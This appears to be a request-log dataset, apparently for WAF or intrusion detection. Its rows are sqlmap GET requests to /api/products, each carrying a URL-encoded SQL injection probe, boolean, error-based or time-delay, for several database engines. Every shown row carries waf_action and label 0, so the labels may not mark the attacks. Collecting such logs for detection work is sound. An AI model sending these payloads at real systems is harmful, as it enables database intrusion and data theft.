@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%27lgiQ%27%20LIKE%20%27lgiQ,/api/products,172.20.0.10,49dce9b6ba434df7489597f6809b0c21,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%22%29%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%28%22Sqoy%22%3D%22Sqoy,/api/products,172.20.0.10,a6360ee862eab842a57109b6519d6b77,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%22%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%22NvOa%22%3D%22NvOa,/api/products,172.20.0.10,d6c8f6fe4c421a2b2ef516b0e6b6a2dd,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%29%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%284951%3D4951,/api/products,172.20.0.10,68135bd9a39a259e349a69ae9a9bfe66,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%29%29%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%28%281051%3D1051,/api/products,172.20.0.10,70ccf79d99626dfe1cf3b6074e692396,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29,/api/products,172.20.0.10,c4d4c1dcbbbbd21e603a13edffc31151,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29--%20ystN,/api/products,172.20.0.10,1e9d2b45456f06613b5ca8466d034425,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%28%27yAGj%27%3D%27yAGj,/api/products,172.20.0.10,11b826326597161e0c766de700e194a6,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%28%28%27sRnL%27%3D%27sRnL,/api/products,172.20.0.10,bfbbbf7f1816aabbe937ce227b341c23,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=%28SELECT%20CONCAT%280x717a717671%2C%28ELT%281978%3D1978%2C1%29%29%2C0x7178787871%29%29,/api/products,172.20.0.10,91629e09f22ec6b46c8a7fda05426c0b,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=%28SELECT%20%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281187%3D1187%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29,/api/products,172.20.0.10,2292a05ee44e083c29582631611be523,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=%28SELECT%20CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%285567%3D5567%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29,/api/products,172.20.0.10,e2459dfaa6692a55f1dcb97451ee0014,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=%28SELECT%20CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28CASE%20WHEN%20%281124%3D1124%29%20THEN%20TO_NUMBER%281%29%20ELSE%20TO_NUMBER%280%29%20END%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%20FROM%20DUAL%29,/api/products,172.20.0.10,3cb0f1604068ebe6bf63271f8c3c93d3,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,9713479a74425a2a8f078e54b68147ec,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,1e08bf5b1f42824687fc95d25706d888,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,7a83620be52da9a1dfb32b1693d031bd,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,7fc9764ef27212f06bc186afd63a0dbe,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,d220365319f614f5da184100dc1d6259,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,01c11c35414259fc74ee115b3c43d018,0.0,5.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,9990b4c2d4623653c40b04271c9f8aef,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%29%29%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,99c07e9671d6981736819137e429cd7c,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%3BSELECT%20SLEEP%285%29%23,/api/products,172.20.0.10,c37ae559c64c8ad32a706eca2902d4af,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,c1f9acf07194144574403e2d8a38b096,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,dd0bb903913ae6b69f6d830041c63219,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,14d8c37764d56de697556b9ebc4106af,0.0,5.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,b1b7be9caab6f891e78d249d8d2530e6,0.0,6.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,5af66fc4967f209440e86c764c34f717,0.0,13.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,cce5cf661d8dca50b8be1aa4e820181f,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,8a658221bb7546ce0d52e47f0e8b342b,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%29%29%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,5e49c66ac4623be1007b3dd46bca7db1,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%25%27%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,572da0169e34aa8e4b3622cbe474b7fc,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%22%29%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,e3d28078d69c36c4140814c134f296c9,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%22%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,8ef21c5dd70d0bb57823fc097998db78,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%29%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,52bfd6516c6d07f9a2f22a0cd6287ba2,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%29%29%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,00dd38453fa948ea3c1357f5425631d4,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=a%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,f44bb0ba593cdcf6ca284206e1e1eec7,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:55+00:00,(empty),GET,/api/products?q=%28SELECT%20CONCAT%28CONCAT%28%27qzqvq%27%2C%28CASE%20WHEN%20%287129%3D7129%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qxxxq%27%29%29,/api/products,172.20.0.10,ba9788e95e9d767a94ca4a12ed18fc7c,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,d6cba0f5fa591b508433eb2afa6af87c,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,e7687f0c7938830a663d3f90ecdf8b4f,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%29%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,9db020a030242d71b2daedcaf37941dd,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,084569857ef45ea9522b3d2f31dc8b5b,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,cbc3e2901b22eeca50454bcc24e318eb,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%22%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,f0bcc3e05e5b610fb1e5757abef82467,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%22%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,9db04ef82dcb51e6519b4a46594c279b,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,4e97648b09efe5a6198e7c6fb23f729e,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%29%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,ed34dee837fd54add04f8b426e04af56,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--,/api/products,172.20.0.10,85673ae918bc0c56b37849301e5c54c3,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,0eeb244e4446eb5f64b8dc5b208bcf54,0.0,5.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%29%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,e26be332dbf62493e24d180ad227ba2e,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,233d1f519b6174480b088fdee2d19a6a,0.0,5.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%25%27%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,9fd24cf3f3daf1df0c1bfefcb6df34c8,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%22%29%3BDECLARE%20%40x%20CHAR%289%29%3BSET%20%40x%3D0x303a303a35%3BWAITFOR%20DELAY%20%40x--,/api/products,172.20.0.10,dc3dde0f4f3dad72bacc32c1393121e9,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%3BSELECT%20PG_SLEEP%285%29--,/api/products,172.20.0.10,d73b2098fd4437dca6d2e995b2bc9027,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,b0329aac04cc2e7a33d937b72b6a8c00,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%29%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,f79bf9469b935e747db8705122db8edb,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%27%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,0202b3a8ae2f520d5b5d7a729a456298,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%25%27%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,c7cd58a191b54479520917ef125fb672,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,4ac4e92594b3c51d6436a0cc0cced09f,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,cd610f71e7224d386ab85fb1b81d85ef,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,1b59e865028cd6d5e339a725ee7d454b,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:56+00:00,(empty),GET,/api/products?q=a%29%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29--,/api/products,172.20.0.10,0cf0c1873ba4dc66a16d085ca416e62d,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:57+00:00,(empty),GET,/api/products?q=a%22%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%28107%29%7C%7CCHR%28103%29%7C%7CCHR%28120%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,4176c56e5c0d87ea286ccd3d4305d604,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:57+00:00,(empty),GET,/api/products?q=a%22%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%28107%29%7C%7CCHR%28103%29%7C%7CCHR%28120%29%2C5%29%20FROM%20DUAL--,/api/products,172.20.0.10,83d60a30610b39666d1a006190f8255c,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
